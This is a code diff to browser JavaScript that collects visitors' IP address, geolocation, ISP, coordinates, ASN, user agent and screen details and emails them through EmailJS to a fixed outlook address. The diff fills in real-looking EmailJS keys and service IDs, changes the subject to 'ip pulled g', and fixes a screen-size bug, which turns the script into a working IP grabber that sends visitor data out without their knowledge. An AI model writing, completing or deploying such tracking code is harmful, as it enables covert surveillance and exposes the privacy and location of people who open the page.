@@ -1,10 +1,10 @@
-// Initialize EmailJS
-emailjs.init("YOUR_PUBLIC_KEY"); // You need to get this from emailjs.com
+// Initialize EmailJS with your public key
+emailjs.init("2jj19BTFwlNnm8fp_");
 
 async function sendEmail(data) {
     const emailData = {
         to_email: "openeyes08@outlook.com",
-        subject: "New IP Info Visit",
+        subject: "ip pulled g ",
         message: `
 IP Address: ${data.ip}
 Location: ${data.location}
@@ -23,7 +23,7 @@ Time: ${new Date().toLocaleString()}
     
     try {
         document.getElementById('email-status').textContent = 'sending email...';
-        await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailData);
+        await emailjs.send("service_14u2qeo", "template_psyarye", emailData);
         document.getElementById('email-status').textContent = 'email sent successfully';
     } catch (error) {
         console.error('Email failed:', error);
@@ -72,13 +72,19 @@ async function loadData() {
         console.error('failed to fetch ip data:', error);
         document.getElementById('ip').textContent = 'error fetching data';
         collectedData.ip = 'error fetching data';
+        collectedData.location = 'error';
+        collectedData.isp = 'error';
+        collectedData.country = 'error';
+        collectedData.timezone = 'error';
+        collectedData.coords = 'error';
+        collectedData.asn = 'error';
     }
     
     // Browser/system info
     document.getElementById('useragent').textContent = navigator.userAgent;
     collectedData.useragent = navigator.userAgent;
     
-    const screen = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+    const screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`;
     document.getElementById('screen').textContent = screen;
     collectedData.screen = screen;
     
